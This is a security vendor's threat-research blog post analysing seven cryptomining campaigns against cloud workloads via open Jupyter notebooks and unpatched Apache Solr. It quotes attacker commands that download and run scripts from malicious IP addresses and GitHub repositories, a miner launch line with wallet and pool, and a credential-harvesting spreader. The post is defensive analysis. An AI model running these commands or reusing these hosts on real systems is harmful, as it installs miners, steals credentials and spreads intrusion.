md:h-8 lg:h-12"></div><article class=""><div class="prose prose-gray max-w-none break-words dark:prose-invert prose-p:text-lg prose-p:leading-8 group-data-[theme=brand]:prose-invert prose-figcaption:text-gray-dark prose-img:my-0 prose-video:my-0 group-data-[theme=brand]:prose-figcaption:text-white marker:size-3 marker:text-lg marker:font-medium marker:text-primary-blue group-data-[theme=brand]:marker:text-white [&amp;:not(:first-child)]:prose-h1:mt-14 prose-headings:font-body prose-headings:text-gray-black prose-h2:text-2xl group-data-[theme=brand]:prose-headings:text-white prose-a:font-semibold prose-a:text-primary-blue prose-a:no-underline hover:prose-a:underline group-data-[theme=brand]:prose-a:text-secondary-blue-dark prose-blockquote:border-primary-blue prose-blockquote:text-gray-black [&amp;_cite&gt;:first-child]:text-primary-blue [&amp;_cite]:text-gray-dark group-data-[theme=brand]:prose-blockquote:border-white group-data-[theme=brand]:prose-blockquote:text-white group-data-[theme=brand]:[&amp;_cite&gt;:first-child]:text-secondary-blue-light group-data-[theme=brand]:[&amp;_cite]:text-secondary-blue-medium prose-code:break-all prose-code:rounded-md prose-code:bg-secondary-blue-medium/10 prose-code:p-1 prose-code:font-mono prose-code:font-normal prose-code:text-primary-blue prose-code:before:hidden prose-code:after:hidden group-data-[theme=brand]:prose-code:bg-secondary-blue-dark group-data-[theme=brand]:prose-code:text-secondary-blue-medium"><p class="">During the summer of 2023, Wiz Research detected several different cryptomining incidents targeting cloud workloads. Combining <a href="https://www.wiz.io/lp/wiz-runtime-sensor">Wiz Runtime Sensor</a> events and information from Wiz agentless scanning, we were able to pinpoint security flaws that led to the attackers’ initial access, assess the scope of the compromised resources, and analyze the attackers’ activities.</p><p class="">Cryptomining stands out as a common threat to cloud workloads since it takes advantage of paid computing resources and yields direct monetary gains for the attackers. The threat actors behind these activities are mostly interested in making quick profits, aiming to spread their opportunistic mining operations as far and as wide as possible. Typically, these attacks aren&#x27;t very complex or stealthy. The attackers usually look for easy ways to get in, such as weak SSH passwords, known configuration mistakes, widespread simple exploits, and other low-hanging fruit.</p><p class="">This is understandably a cause for concern for our customers since it can potentially lead to financial losses. Furthermore, it indicates the presence of security flaws that could lead to higher-impact attacks. </p><p class="">In this blog post, we cover seven incidents of cryptomining activities. The first few campaigns utilized open Jupyter Notebooks as an initial access vector, while the rest exploited unpatched Apache Solr v8.1.1. Each campaign used different tooling, which we’ll discuss in detail. </p><p class="">Our main observations from the various campaigns we investigated are as follows:  </p><ul><li><p class="my-0">Threat actors used three different open-source miners: <a rel="noreferrer noopener" target="_blank" href="https://xmrig.com/"><u>XMRig</u></a>, <a rel="noreferrer noopener" target="_blank" href="https://github.com/tpruvot/ccminer"><u>CC</u></a><a rel="noreferrer noopener" target="_blank" href="https://github.com/tpruvot/ccminer">miner</a>, and <a rel="noreferrer noopener" target="_blank" href="https://github.com/fireice-uk/xmr-stak"><u>Xmr-Stack-RX</u></a>.  </p></li><li><p class="my-0">Attackers often abused administrative tools—including <a rel="noreferrer noopener" target="_blank" href="https://tmate.io/"><u>tmate</u></a>, <a rel="noreferrer noopener" target="_blank" href="https://proot-me.github.io/"><u>PRoot</u></a>, and <a rel="noreferrer noopener" target="_blank" href="https://ngrok.com/"><u>ngrok</u></a>—to maintain a foothold in the compromised resources and avoid detection.  </p></li><li><p class="my-0">Malicious actors abused file-hosting services like GitHub, Dropbox, and Pastebin to host their tools and configuration files.</p></li></ul><p class="">The table below summarizes the different incidents: </p><div class="max-w-[90vw] overflow-x-auto"><table class="my-8 md:my-14"><thead><tr><th class="border-r pl-3 align-top font-sans !text-base last-of-type:border-r-0">Incident</th><th class="border-r pl-3 align-top font-sans Solr</span></td><td class="border-r pl-3 font-sans last-of-type:border-r-0"><span>XMRig</span></td><td class="border-r pl-3 font-sans last-of-type:border-r-0"><span>-</span></td><td class="border-r class="border-r pl-3 font-sans last-of-type:border-r-0"><span>Unpatched Apache Solr</span></td><td class="border-r pl-3 font-sans last-of-type:border-r-0"><span>XMRig</span></td><td class="border-r pl-3 font-sans last-of-type:border-r-0"><span>-</span></td><td class="border-r pl-3 font-sans last-of-type:border-r-0"><span>Dedicated C2</span></td></tr></tbody></table></div><p class="">To learn more about the incidents and their attack flow, read the following sections. All IoCs are listed in the Appendix at the end of this post.  </p><h2><div class=""></div><a id="initial-access-vector-open-jupyter-notebook-9" class="relative -top-20"></a>Initial access vector: open Jupyter Notebook </h2><p class="">Jupyter Notebook is a common computing platform, which is sometimes misconfigured to allow remote unauthenticated access, effectively enabling remote code execution on the host machine. </p><h3><div class=""></div><a id="incident-1--pyloose-11" class="relative -top-20"></a>Incident #1 – Pyloose </h3><p class="">Pyloose is a fileless XMRig attack delivered via a Python loader. The loader uses <a rel="noreferrer noopener" target="_blank" href="https://man7.org/linux/man-pages/man2/memfd_create.2.html"><u>memfd</u></a>, a known Linux fileless technique, and is generated using the <a rel="noreferrer noopener" target="_blank" href="https://github.com/nnsee/fileless-elf-exec"><u>fileless-elf-exec</u></a> open-source tool. Read more about PyLoose in our blog post published last July, <a rel="noreferrer noopener" target="_blank" href="https://www.wiz.io/blog/pyloose-first-python-based-fileless-attack-on-cloud-workloads"><u>PyLoose in PyLoose: Python-based fileless malware targets cloud workloads to deliver cryptominer.</u></a> </p><h3><div class=""></div><a id="incident-2--newhello-13" class="relative -top-20"></a>Incident #2 – newhello </h3><p class="">This attack included a renamed XMRig miner hosted on a GitHub repository. The miner was renamed “newhello” and was executed with the use of <a rel="noreferrer noopener" target="_blank" href="https://tmate.io/"><u>tmate</u></a> and <a rel="noreferrer noopener" target="_blank" href="https://proot-me.github.io/"><u>PRoot</u></a> tools.  </p><p class="">Before we delve into the attack flow, let’s understand what tmate and PRoot are and how they can be abused by attackers: </p><p class=""><strong>tmate – </strong>tmate is a service that provides terminal-sharing and remote-collaboration capabilities. It allows developers to share their command-line terminal sessions with others in real time, enabling collaborative debugging, troubleshooting, and programming. tmate is often abused by attackers to conduct reverse-SSH tunneling [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1048/"><u>T1048</u></a>] [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1219/"><u>T1219</u></a>] to a compromised resource. However, in this incident, tmate was used to keep the shell session alive and maximize the execution time of the miner.  </p><p class=""><strong>PRoot – </strong>PRoot is a user-space implementation of the chroot mechanism in Linux. chroot is a UNIX-like operating system feature that allows a process and its descendants to see a modified root directory structure, effectively isolating them from the rest of the filesystem. This can be used for various purposes, such as testing, debugging, or running potentially unsafe software in a controlled environment.</p><p class="">PRoot extends this concept by providing a way to run a program with an altered root directory without requiring superuser privileges. Unlike traditional chroot, which requires administrative access, PRoot can be used by regular users to create isolated environments. </p><p class="">PRoot achieves this by intercepting system calls made by the program and redirecting them to the appropriate locations within the modified root directory. This way, the program believes it&#x27;s running in a different environment than the actual host system. PRoot can be particularly useful for tasks like testing software builds, running old or incompatible programs, and performing system-recovery tasks without affecting the main system.</p><p class="">Threat actors abuse PRoot for two main reasons:  </p><p class="">1. By dropping PRoot together with an archived filesystem on the compromised resource, attackers can prepare their entire toolset inside the dropped filesystem without relying on the existing tools and exact architecture of the compromised resource (the bring-your-own-filesystem method). </p><p class="">2. Because PRoot uses process injection and emulation methods, attackers can utilize PRoot to bypass security measures [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/tactics/TA0005/"><u>TA0005</u></a>] and detections that rely on specific system calls.</p><p class="">Below is an example of executing <code>which nc</code> before and after switching to a different isolated filesystem environment with PRoot. We can see that netcat was not installed in the root filesystem, but was installed on the other filesystem:</p><figure><button type="button" class="w-full cursor-zoom-in"><div style="aspect-ratio:7.7875" class="relative overflow-hidden rounded-md sm:rounded-xl w-full shadow-md sm:shadow-xl"><div class="z-[1]" type="image/webp"/><source srcSet="https://www.datocms-assets.com/75231/1694002727-1.png?dpr=0.25&amp;fm=webp 155w,https://www.datocms-assets.com/75231/1694002727-1.png?dpr=0.5&amp;fm=webp 311w,https://www.datocms-assets.com/75231/1694002727-1.png?dpr=0.75&amp;fm=webp 467w,https://www.datocms-assets.com/75231/1694002727-1.png?fm=webp 623w" sizes="(max-width: 623px) 100vw, 623px"/><img src="https://www.datocms-assets.com/75231/1694002727-1.png?fm=webp" alt="" style="position:absolute;left:0;top:0;width:100%;height:100%;max-width:none;max-height:none" loading="lazy"/></picture></noscript></div></div></button></figure><h4><div class=""></div><a id="attack-flow-25" class="relative -top-20"></a>Attack flow</h4><p class="">First, the threat actor downloaded tmate from its official GitHub repository using <code>wget</code> [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1105/"><u>T1105</u></a>], extracted it, and executed it with the <code>–F</code> flag (run in foreground). Via the tmate session, the attacker downloaded the renamed XMRig miner “newhello” [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1496/"><u>T1496</u></a>] from a dedicated GitHub repository [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1102/"><u>T1102</u></a>] that we believe was created and deleted by the attacker.  </p><p class="">The attacker then downloaded an archived file named <code>akuh.zip</code> that includes the PRoot tool and an archived filesystem. <code>akuh.zip</code> was downloaded from a <a rel="noreferrer noopener" target="_blank" href="https://github.com/akuhnet/"><u>GitHub repository</u></a> [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1102/"><u>T1102</u></a>] belonging to <code>akuh.net</code>, a hub that contains different tools and information for tech hacks.  </p><p class="">Next, the attacker executed the following PRoot command from the extracted filesystem <code>./dist/proot -S . /bin/bash</code>. This PRoot command created an isolated environment using the current directory as the root and started a Bash instance within that environment, meaning every command within the Bash session was executed within the isolated environment [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/tactics/TA0005/"><u>TA0005</u></a>].  </p><p class="">Lastly, the attacker executed <code>newhello</code> with its wallet parameter inside the isolated environment.</p><h3><div class=""></div><a id="incident-3--ccminer-30" class="relative -top-20"></a>Incident #3 – CCminer </h3><p class="">What is unique about this incident is that the threat actor used udocker to create a containerized environment based on the Debian Docker image to build and run the <a rel="noreferrer noopener" target="_blank" href="https://github.com/monkins1010/ccminer"><u>CCminer</u></a> cryptominer.  </p><p class=""><a rel="noreferrer noopener" target="_blank" href="https://github.com/indigo-dc/udocker"><u>udocker</u></a> – an open-source project written in Python that runs Docker images without having root privileges. udocker harnesses several tools such as PRoot, Fakechroot, runc, and Singularity. Without root privileges, these containers cannot access sensitive files or mount a filesystem. However, they are not required to execute cryptominers. udocker is beneficial in that it has a base image with ready-to-use tools. </p><h4><div class=""></div><a id="attack-flow-33" class="relative -top-20"></a>Attack flow</h4><p class="">The attacker downloaded tmate for persistent session <code>curl -LJOk https://github.com/kevinkarinppq/tm/raw/main/tmate</code>. Then, the attacker used wget [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1105/"><u>T1105</u></a>] from the tmate session to download the udocker tool [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/tactics/TA0005/"><u>TA0005</u></a>] and created a <code>debian:bullseye</code>-based container.  <br/>The attacker downloaded CCminer [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1496/"><u>T1496</u></a>] within this container via git clone (<code>git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git</code>). The attacker built the CCminer inside the container and then launched it, as seen via the command <code>./ccminer -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RXdK9Kiiz2pLUu9k8i7Tx9RKhLEnCJq9Us.M1</code>. </p><h3><div class=""></div><a id="incident-4--notebooks-ngrok-and-cryptominers-35" class="relative -top-20"></a>Incident #4 – Notebooks, ngrok, and cryptominers </h3><p class="">In this attack incident, the attacker attempted to use ngrok to connect remotely to the Jupyter notebook and deploy the cryptominer. Instead of utilizing a C2, the attacker relied on different Github repositories that hosted dedicated tools and miners. </p><h4><div class=""></div><a id="attack-flow-37" class="relative -top-20"></a>Attack flow</h4><p class="">The attacker downloaded tmate from the Github repository [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1102/"><u>T1102</u></a>] <code>https://github.com/Arsiflaku/arsilflalku/releases/download/v.1.0/setup.tar.gz</code>. In an attempt to avoid detection, tmate was renamed “python” [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/tactics/TA0005/"><u>TA0005</u></a>]. The “Arsiflaku” GitHub user was created on May 8th 2023 and seems to have been created to specifically host the renamed tmate tool (at the time of writing, this user has only one repository hosting one release: <code>setup.tar.gz</code>). The attacker then executed tmate with the <code>–F</code> flag (<code>python -F</code>).   </p><p class="">Inside the tmate session, the attacker downloaded and executed the <code>root.sh</code> script that was in charge of downloading PRoot and the filesystem from <code>https://media.githubusercontent.com/media/akuhnet/wqemu/master/akuh.zip</code> (the same repository used in the first incident). The script was downloaded from <code>https://raw.githubusercontent.com/akuhnet/wqemu/main/root.sh</code>.</p><figure><button type="button" class="w-full cursor-zoom-in"><div attacker downloaded and executed <code>run.sh</code> from another Github repository. This was the script tasked with downloading and executing ngrok [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1048/"><u>T1048</u></a>] [<a rel="noreferrer loading="lazy"/></picture></noscript></div></div></button><figcaption class="mt-5 block px-8 text-center text-sm">The run.sh script </figcaption></figure><p class="">ngrok was executed with the <code>1xTuUNq7C1dGOlcNLDTE6w1x5Kf_52a2n6e18VgdiWYc9AzFS</code> token. The Github user had been active since September 2022 and hosted different miners and malicious scripts.  </p><p class="">In another instance, we saw the use of a similar script hosted on <code>https://raw.githubusercontent.com/0x-raafet/ngrok-ssh-tunnel/main/ngrok-ssh.sh</code>. The <code>ngrok-ssh-tunnel</code> repository was quickly deleted; however, at the time of writing, the <code>0x-raafet</code> Github user hosts 34 repositories that contain malicious scripts, miners, rootkits, and more. </p><p class="">We have no evidence of a cryptominer [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1496/"><u>T1496</u></a>] being delivered in this incident. Nevertheless, after further investigation we discovered that this was a known hack that utilized ngrok and tmate to abuse open notebooks such as Google Collab to execute cryptominers on the underlying infrastructure. For example, <a rel="noreferrer noopener" target="_blank" href="https://github.com/a2nk/get-xmr"><u>https://github.com/a2nk/get-xmr</u></a> and <a rel="noreferrer noopener" target="_blank" href="https://github.com/akuhnet/Colab-SSH"><u>https://github.com/akuhnet/Colab-SSH</u></a> are two different GitHub repositories that contain open-source IPython Notebook files (.ipynb) and instructions on how to conduct this type of attack.   </p><p class="">Let’s take a closer look at the <a rel="noreferrer noopener" target="_blank" href="https://github.com/akuhnet/Colab-SSH"><u>https://github.com/akuhnet/Colab-SSH</u></a> repository. The screenshot below is of an IPython Notebook file that downloads and executes tmate and ngrok to allow remote-SSH access to the underlying infrastructure. Under “Auto Reconnect”, there are instructions on how to prevent the notebook from shutting down.</p><figure><button type="button" class="w-full cursor-zoom-in"><div class="">The repository also contains instructions for downloading the <a rel="noreferrer noopener" target="_blank" href="https://www.nicehash.com/nicehash-miner"><u>nicehash</u></a> miner, which is also hosted on it under the name “dev”. The command in the screenshot below could be executed via tmate or ngrok interactive SSH sessions to deliver the miner.</p><figure><button type="button" class="w-full cursor-zoom-in"><div 541w,https://www.datocms-assets.com/75231/1694003061-5.png?dpr=0.75&amp;fm=webp 811w,https://www.datocms-assets.com/75231/1694003061-5.png?fm=webp 1082w" sizes="(max-width: 1082px) 100vw, 1082px" 541w,https://www.datocms-assets.com/75231/1694003061-5.png?dpr=0.75&amp;fm=webp 811w,https://www.datocms-assets.com/75231/1694003061-5.png?fm=webp 1082w" sizes="(max-width: 1082px) 100vw, 1082px"/><img src="https://www.datocms-assets.com/75231/1694003061-5.png?fm=webp" alt="" style="position:absolute;left:0;top:0;width:100%;height:100%;max-width:none;max-height:none" loading="lazy"/></picture></noscript></div></div></button><figcaption class="mt-5 block px-8 text-center text-sm">The BTC nicehash.md file from the Colab-SSH repository </figcaption></figure><h3><div class=""></div><a id="incident-5---xmr-stak-rx-50" class="relative -top-20"></a>Incident #5 - XMR-Stak-RX </h3><p class="">This was a simple attack that used the XMR-Stak-RX miner. Interestingly, the attacker hosted the miner’s configuration files on Dropbox. </p><h4><div class=""></div><a id="attack-flow-52" class="relative -top-20"></a>Attack flow </h4><p class="">First, the XMR-Stak-Miner miner [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1496/"><u>T1496</u></a>] was downloaded from its GitHub repository <code>sh -c wget https://github.com/fireice-uk/xmr-stak/releases/download/1.0.5-rx/xmr-stak-rx-linux-1.0.5-cpu.tar.xz</code>. After the miner was extracted, <code>pools.txt</code> and <code>configuration.txt</code> were downloaded from Dropbox [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1102/"><u>T1102</u></a>] via <code>wget</code> [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1105/"><u>T1105</u></a>] to the same working directory. Lastly, the miner was executed.</p><h2><div class=""></div><a id="initial-access-vector-unpatched-apache-solr-54" class="relative -top-20"></a>Initial access vector: unpatched Apache Solr </h2><p class="">The following two incidents occurred on a publicly accessible instance of Apache Solr v8.1.1. In both cases, the attacker&#x27;s initial runtime command was executed under the Java process of Apache Solr. Therefore, we have a high level of confidence in assessing that the initial access was gained through an exploit targeting this service. Version 8.1.1 is known to have multiple Remote Code Execution (RCE) vulnerabilities, including <a rel="noreferrer noopener" target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2019-0193"><u>CVE-2019-0193</u></a>, <a rel="noreferrer noopener" target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2019-12409"><u>CVE-2019-12409,</u></a> <a rel="noreferrer noopener" target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2019-17558"><u>CVE-2019-17558</u></a>, and <a rel="noreferrer noopener" target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228"><u>CVE-2021-44228</u></a>, making it a prime target for exploitation.  </p><p class="">The Java process of Apache Solr was launched with the <code>-Dlog4j2.formatMsgNoLookups=true</code> parameter. Due to this configuration, we can conclude that the initial access did not occur via CVE-2021-44228 (Log4Shell). We are actively investigating these incidents and are open to collaboration on further research.  </p><p class="">Based on our data, ~6.5% of cloud customers have at least one VM that is publicly exposed to the internet and running a vulnerable Apache Solr.  </p><h3><div class=""></div><a id="incident-6--kinsing-58" class="relative -top-20"></a>Incident #6 – Kinsing </h3><p class="">Since it was <a rel="noreferrer noopener" target="_blank" href="https://www.alibabacloud.com/blog/new-outbreak-of-h2miner-worms-exploiting-redis-rce-detected_595743"><u>first documented</u></a> by Alibaba Cloud at the beginning of 2020, Kinsing (aka H2Miner) has been evolving and actively spreading to cloud workloads via different known exploits and misconfigurations.  </p><p class="">Beyond serving as a cryptominer dropper, Kinsing also has backdoor and worm capabilities.  </p><h4><div class=""></div><a id="attack-flow-61" class="relative -top-20"></a>Attack flow </h4><p class="">Upon successful exploitation, the attacker dropped the initial script under <code>/tmp/zzz</code> using the <code>curl -o /tmp/zzz 194.87.252[.]159/s.sh</code> [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1105/"><u>T1105</u></a>] command, modified its permissions [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1222/002/"><u>T1222.002</u></a>], and executed it. This initial script is tasked with killing existing miner processes and their cronjobs, disabling security measures [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1562/001/"><u>T1562.001</u></a>] and logging, creating persistence via cronjobs [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1053/"><u>T1053</u></a>], and dropping and executing Kinsing malware.  </p><p class="">Because the script detected that the user id was not root (<code>user_id == 0</code>), Kinsing was dropped under the <code>tmp</code> directory (and not under <code>etc</code>). During its execution, Kinsing communicated with its C2 [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/tactics/TA0011/"><u>TA0011</u></a>] for further instructions and health checks. Kinsing created the <code>.ICEd-unix</code> [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1564/001/"><u>T1564.001</u></a>] directory under <code>tmp</code>. This directory held the <code>uuid</code> file, a unique victim identifier [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1074/"><u>T1074</u></a>], and hosted temporary artifacts used by the malware such as shell scripts. </p><p class="">During its execution, Kinsing dropped and executed the following tools: </p><p class="">1. <code>kdevtmpfsi</code> - UPX-packed [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1027/002/"><u>T1027.002</u></a>] XMRig miner [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1496/"><u>T1496</u></a>] (version 6.16.4), dropped under <code>/tmp</code>. The miner was dropped from <code>31[.]184.240.34/x</code> to <code>/tmp/kdevtmpfsi</code>. The miner is compiled with its configuration; however, the configuration was not used. The network traffic captured below shows the JSON-RPC login message via the Stratum protocol establishing authorization to the miner’s pool.</p><figure><button type="button" class="w-full cursor-zoom-in"><div style="aspect-ratio:1.656084656084656" class="relative overflow-hidden rounded-md sm:rounded-xl w-full shadow-md sm:shadow-xl"><div class="z-[1]" style="overflow:hidden;position:absolute;left:0;top:0;width:100%;height:100%;max-width:none;max-height:none"><img aria-hidden="true" alt="" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHBw4HCAgUDQ0LDg0LDRgHDg0GCBEOFggNFx8ZGCITFhUaHysjGh0oHRUWJDUlKC0vMjIyGSI4PTcwPCsxMi8BCgsLDgoOEA0QHC8cFhwvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vL//AABEIAA8AGAMBIgACEQEDEQH/xAAXAAEAAwAAAAAAAAAAAAAAAAABAAIH/8QAFRABAQAAAAAAAAAAAAAAAAAAABH/xAAWAQADAAAAAAAAAAAAAAAAAAABAgP/xAAXEQADAQAAAAAAAAAAAAAAAAAAAhMB/9oADAMBAAIRAxEAPwDSqlAPPClmL0AhPAVY/9k=" srcSet="https://www.datocms-assets.com/75231/1694003128-6.png?dpr=0.25&amp;fm=webp 156w,https://www.datocms-assets.com/75231/1694003128-6.png?dpr=0.5&amp;fm=webp 313w,https://www.datocms-assets.com/75231/1694003128-6.png?dpr=0.75&amp;fm=webp 469w,https://www.datocms-assets.com/75231/1694003128-6.png?fm=webp 626w" sizes="(max-width: 626px) 100vw, 626px" type="image/webp"/><source srcSet="https://www.datocms-assets.com/75231/1694003128-6.png?dpr=0.25&amp;fm=webp 156w,https://www.datocms-assets.com/75231/1694003128-6.png?dpr=0.5&amp;fm=webp 313w,https://www.datocms-assets.com/75231/1694003128-6.png?dpr=0.75&amp;fm=webp 469w,https://www.datocms-assets.com/75231/1694003128-6.png?fm=webp 626w" sizes="(max-width: 626px) 100vw, 626px"/><img src="https://www.datocms-assets.com/75231/1694003128-6.png?fm=webp" alt="" style="position:absolute;left:0;top:0;width:100%;height:100%;max-width:none;max-height:none" loading="lazy"/></picture></noscript></div></div></button><figcaption class="mt-5 block px-8 text-center text-sm"> The JSON-RPC login message </figcaption></figure><p class="">2. <code>spre.sh</code> - this script searches for SSH credentials [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1552/004/"><u>T1552.004</u></a>] on the infected resource by reading <code>bash_history</code> [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1552/003/"><u>T1552.003</u></a>], SSH config and SSH <code>known_hosts</code> files, and then attempts to spread to other resources via SSH. The script was dropped from <code>194[.]87.252.159/spre.sh</code> to a random five-character file name under <code>/tmp/.ICEd-unix/</code> (e.g. <code>/tmp/.ICEd-unix/wcMYi</code>) and was deleted after execution. </p><p class="">3. <code>cron.sh</code> - this script is responsible for updating the cronjob with a new IP and killing other miners’ processes and cronjobs. The script was dropped from <code>194[.]87.252.159/cron.sh</code> to a random five-character file name under <code>/tmp/.ICEd-unix/</code> (e.g. <code>/tmp/.ICEd-unix/RHBHO</code>) and was deleted after execution.</p><p class="">At the time of analysis, the sample hadn’t downloaded any additional scripts; however, the malware-hosting IP that was used in this incident hosted many additional scripts including the rootkit installation script (<code>194[.]87.252.159/ap.sh</code>) and the <code>.so</code> file itself (<code>194[.]87.252.159/libsystem.so</code>). Read more about Kinsing’s rootkit [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1574/006/"><u>T1574.006</u></a>] usage in <a rel="noreferrer noopener" target="_blank" href="https://www.trendmicro.com/ru_ru/research/20/k/analysis-of-kinsing-malwares-use-of-rootkit.html"><u>Trend Micro’s analysis</u></a>.  </p><h3><div class=""></div><a id="incident-7---z0miner-70" class="relative -top-20"></a>Incident #7 - z0Miner  </h3><p class="">This XMRig miner attack is named &quot;z0Miner&quot; and was initially reported by <a rel="noreferrer noopener" target="_blank" href="https://s.tencent.com/research/report/1170.html">Tencent,</a> targeting vulnerable WebLogic servers. Later it was documented targeting vulnerable Atlassian Confluence servers running on both Linux and Windows operating systems (see the <u>Imperva</u> and <a rel="noreferrer noopener" target="_blank" href="https://asec.ahnlab.com/en/36820/"><u>ASEC AhnLab</u></a> blog posts detailing the campaigns). This attack was also reported by <a rel="noreferrer noopener" target="_blank" href="https://news.sophos.com/en-us/2022/03/29/horde-of-miner-bots-and-backdoors-leveraged-log4j-to-attack-vmware-horizon-servers/"><u>Sophos</u></a> as targeting VMware-Horizon servers via Log4Shell. </p><p class="">Interestingly, we observed usage of the same Monero wallet <code>44Lu9jhKUuTVcSwGL1jLU6MKyFVNewBdL5mT13fjxLhFTSa5i6E5hMrAv1SmH16NYvc51GY6RnvQSKM4CDFFRov68aRFgYi</code> mentioned in the report by <a rel="noreferrer noopener" target="_blank" href="https://asec.ahnlab.com/en/36820/"><u>ASEC AhnLab</u></a><u>,</u> leading us to believe that this activity was likely conducted by the same threat actor.  </p><h4><div class=""></div><a id="attack-flow-73" class="relative -top-20"></a>Attack flow</h4><p class="">Upon successful exploitation, the attacker downloaded the dropper script from the malware-hosting server <code>/tmp/.solrb</code> using curl [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1105/"><u>T1105</u></a>] <code>curl -fsSL http://175.118.126[.]65:8002/js/l.txt -o /tmp/.solrb</code>. This script kills other mining processes and attempts to create a cronjob [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1053/"><u>T1053</u></a>] using a script from Pastebin <code>https://pastebin.com/raw/GHgCMLRk</code> [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1102/"><u>T1102</u></a>] (which seems to be altered).  </p><p class="">As described in the code snippet below, the script checks whether the <code>solrd</code> process is already running. If not, it creates a hidden directory under <code>/tmp/.solr</code> [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1564/001/"><u>T1564.001]</u></a>, downloads the init script (<code>/tmp/.solr/solr.sh</code>), the XMRig miner [<a rel="noreferrer noopener" target="_blank" href="https://attack.mitre.org/techniques/T1496/"><u>T1496</u></a>] (<code>/tmp/.solr/solrd</code>), and its configuration file (<code>/tmp/.solr/config.json</code>). Lastly the script executes the init script with <code>nohup</code> so it continues to run after the shell is terminated, sleeps for 10 seconds, and finally deletes the init script from the disk.</p><figure><button type="button" class="w-full cursor-zoom-in"><div style="aspect-ratio:3.8536585365853657" class="relative overflow-hidden rounded-md sm:rounded-xl w-full shadow-md init script is responsible for continuously killing other cryptomining processes and ensuring that the solrd miner is executed with <code>nohup</code>. loading="lazy"/></picture></noscript></div></div></button><figcaption class="mt-5 block px-8 text-center text-sm">The solr.sh script </figcaption></figure><h2><div class=""></div><a id="how-can-wiz-help-79" class="relative -top-20"></a>How can Wiz help?  </h2><h4><div class=""></div><a id="risk-management-80" class="relative -top-20"></a>Risk management</h4><ul><li><p class="my-0">The Wiz agentless host configuration scanner detects misconfigured Jupyter Notebook server instances, allowing you to pinpoint any publicly exposed instances in your environment that allow remote unauthenticated access from any IP address. </p></li><li><p class="my-0">The Wiz agentless scanner detects vulnerabilities in different technologies, including Apache Solr. Furthermore, Wiz Runtime Sensor&#x27;s &quot;validated in runtime&quot; feature can help check whether the vulnerable library is in use. This capability combined with contextual information from Wiz agentless scanner (including exposure, sensitive permissions, and more), allows security teams to better prioritize patching efforts. </p></li></ul><h4><div class=""></div><a id="threat-detection-82" class="relative -top-20"></a>Threat detection<strong> </strong></h4><p class="">The<strong> </strong>Wiz Runtime Sensor detects different types of malicious activity as an adversary moves through the attack chain:</p><ul><li><p class="my-0">Initial payload delivery (e.g. the Sensor rule: “File created/modified by an ingress tool that established a remote connection”) </p></li><li><p class="my-0">Access to sensitive files on the resource (e.g: “Shell history was accessed”)  </p></li><li><p class="my-0">Container drift execution of a payload on a writable layer (e.g: “Container drift - image file not present in container image was executed”)  </p></li><li><p class="my-0">Execution of the final intended cryptomining activity (e.g: “Connection to a known cryptomining pool”).  </p></li></ul><p class="">For example, the alert below details access to a shell history file by the spreader script that was executed by Kinsing. Click <a rel="noreferrer noopener" target="_blank" href="https://www.wiz.io/blog/wiz-expands-platform-with-the-runtime-sensor-to-provide-unified-cloud-security"><u>here</u></a> to learn more about the Wiz Runtime Sensor.</p><figure><button type="button" class="w-full cursor-zoom-in"><div style="aspect-ratio:0.7199424046076314" class="relative overflow-hidden rounded-md sm:rounded-xl w-full 2000px"/><img src="https://www.datocms-assets.com/75231/1694003396-9.png?fm=webp" alt="" style="position:absolute;left:0;top:0;width:100%;height:100%;max-width:none;max-height:none" loading="lazy"/></picture></noscript></div></div></button></figure><h2><div class=""></div><a id="summary-87" class="relative -top-20"></a>Summary</h2><p class="">Threat actors behind cryptominers are often seeking easy access to cloud workloads and are still successfully 